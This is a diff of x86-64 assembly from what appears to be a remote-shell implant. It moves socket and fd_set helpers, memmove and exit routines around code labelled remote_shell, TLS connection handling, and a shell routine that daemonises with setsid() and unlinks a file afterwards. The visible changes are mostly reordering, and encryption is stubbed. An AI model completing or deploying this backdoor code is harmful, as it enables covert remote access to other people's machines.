@@ -80,117 +80,6 @@ section .text
 global remote_shell
 global _start
 
-make_non_blocking:							; fd : edi
-
-	mov rax, SYS_FCNTL
-	mov esi, F_GETFL
-	mov rdx, 0x0
-	syscall
-	cmp rax, 0x0
-	js sys_exit
-	mov rcx, rax							; rcx = fcntl(fd, F_GETFL, 0)
-	mov rax, SYS_FCNTL
-	mov esi, F_SETFL
-	mov rdx, rcx
-	or rdx, O_NONBLOCK
-	syscall									; fcntl(fd, F_SETFL, rcx | O_NONBLOCK)
-	cmp rax, 0x0
-	js sys_exit
-	ret
-
-htons:										; swap 2 first bytes of rdi
-	xor rax, rax 
-%ifdef IS_LITTLE_ENDIAN
-	ror di, 0x8
-%endif
-	mov ax, di								; TODO ifndef
-	ret
-
-%define NFDBITS 64
-
-fd_elt:
-	xor rax, rax
-	xor rdx, rdx
-	mov eax, edi
-	mov ecx, NFDBITS
-	idiv ecx
-	ret
-
-fd_mask:
-	xor rax, rax
-	xor rdx, rdx
-	mov eax, edi
-	mov ecx, NFDBITS
-	cdq
-	idiv ecx
-	mov rax, 0x1
-	xor rcx, rcx
-	mov cl, dl
-	shl rax, cl
-	ret
-
-fdzero:
-	push rdi
-	mov rcx, 0x10							; repeat rcx time
-	xor rax, rax							; use rax value
-	cld										; go forward
-	rep stosq ;[rdi]						; set rax into [rdi++] rcx time
-	pop rdi
-	ret
-
-fdset:
-	call fd_elt
-	push rax
-	call fd_mask
-	pop rcx
-	or [rsi + rcx], rax
-	ret
-
-fdisset:
-	call fd_elt
-	push rax
-	call fd_mask
-	pop rcx
-	and rax, [rsi + rcx]
-	ret
-
-encrypt:
-	; TODO: Include
-	ret
-
-decrypt:
-	; TODO: Include
-	ret
-
-memmove:	; memmove(void *dst, const void *src, size_t len)
-	mov rcx, rdx
-	inc rcx
-	cmp rsi, rdi
-	jb .memmove_src_addr_before
-	je .memmove_end
-	mov rcx, -1
-.memmove_memcpy:							; copy begin to end
-	inc rcx
-	mov r8b, BYTE [rsi + rcx]
-	mov BYTE [rdi + rcx], r8b
-	cmp rcx, rdx
-	jb .memmove_memcpy
-	jmp .memmove_end
-.memmove_src_addr_before:					; copy end to begin
-	dec rdx
-	mov r8b, BYTE [rsi, + rcx]
-	mov BYTE [rdi + rcx], r8b
-	test rcx, rcx
-	jnz .memmove_src_addr_before
-.memmove_end:
-	mov rax, rdi
-	ret
-
-sys_exit:
-	mov rax, SYS_EXIT
-	mov rdi, 0x0
-	syscall
-
 _start:
 remote_shell: ; rdi: key (QWORD)
 
@@ -475,11 +364,6 @@ end_conection:
 finish_tls:
 	jmp sys_exit
 
-proceed_execution:
-	add rsp, STACKSZ
-	pop rbp
-	ret
-
 shell:
 	mov rax, SYS_SETSID						; Proceed to create a new deamon
 	syscall									; setsid()
@@ -587,6 +471,125 @@ finish_shell:
 	lea rdi, [mlock_shell_filename]
 	syscall									; unlink(mlock_shell_filename)
 	jmp sys_exit
+
+
+make_non_blocking:							; fd : edi
+
+	mov rax, SYS_FCNTL
+	mov esi, F_GETFL
+	mov rdx, 0x0
+	syscall
+	cmp rax, 0x0
+	js sys_exit
+	mov rcx, rax							; rcx = fcntl(fd, F_GETFL, 0)
+	mov rax, SYS_FCNTL
+	mov esi, F_SETFL
+	mov rdx, rcx
+	or rdx, O_NONBLOCK
+	syscall									; fcntl(fd, F_SETFL, rcx | O_NONBLOCK)
+	cmp rax, 0x0
+	js sys_exit
+	ret
+
+htons:										; swap 2 first bytes of rdi
+	xor rax, rax 
+%ifdef IS_LITTLE_ENDIAN
+	ror di, 0x8
+%endif
+	mov ax, di								; TODO ifndef
+	ret
+
+%define NFDBITS 64
+
+fd_elt:
+	xor rax, rax
+	xor rdx, rdx
+	mov eax, edi
+	mov ecx, NFDBITS
+	idiv ecx
+	ret
+
+fd_mask:
+	xor rax, rax
+	xor rdx, rdx
+	mov eax, edi
+	mov ecx, NFDBITS
+	cdq
+	idiv ecx
+	mov rax, 0x1
+	xor rcx, rcx
+	mov cl, dl
+	shl rax, cl
+	ret
+
+fdzero:
+	push rdi
+	mov rcx, 0x10							; repeat rcx time
+	xor rax, rax							; use rax value
+	cld										; go forward
+	rep stosq ;[rdi]						; set rax into [rdi++] rcx time
+	pop rdi
+	ret
+
+fdset:
+	call fd_elt
+	push rax
+	call fd_mask
+	pop rcx
+	or [rsi + rcx], rax
+	ret
+
+fdisset:
+	call fd_elt
+	push rax
+	call fd_mask
+	pop rcx
+	and rax, [rsi + rcx]
+	ret
+
+encrypt:
+	; TODO: Include
+	ret
+
+decrypt:
+	; TODO: Include
+	ret
+
+memmove:	; memmove(void *dst, const void *src, size_t len)
+	mov rcx, rdx
+	inc rcx
+	cmp rsi, rdi
+	jb .memmove_src_addr_before
+	je .memmove_end
+	mov rcx, -1
+.memmove_memcpy:							; copy begin to end
+	inc rcx
+	mov r8b, BYTE [rsi + rcx]
+	mov BYTE [rdi + rcx], r8b
+	cmp rcx, rdx
+	jb .memmove_memcpy
+	jmp .memmove_end
+.memmove_src_addr_before:					; copy end to begin
+	dec rdx
+	mov r8b, BYTE [rsi, + rcx]
+	mov BYTE [rdi + rcx], r8b
+	test rcx, rcx
+	jnz .memmove_src_addr_before
+.memmove_end:
+	mov rax, rdi
+	ret
+
+sys_exit:
+	mov rax, SYS_EXIT
+	mov rdi, 0x0
+	syscall
+
+proceed_execution:
+	add rsp, STACKSZ
+	pop rbp
+	;ret
+
+;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 ; _start: ; just for testing
 ; 	mov rdi, 1234
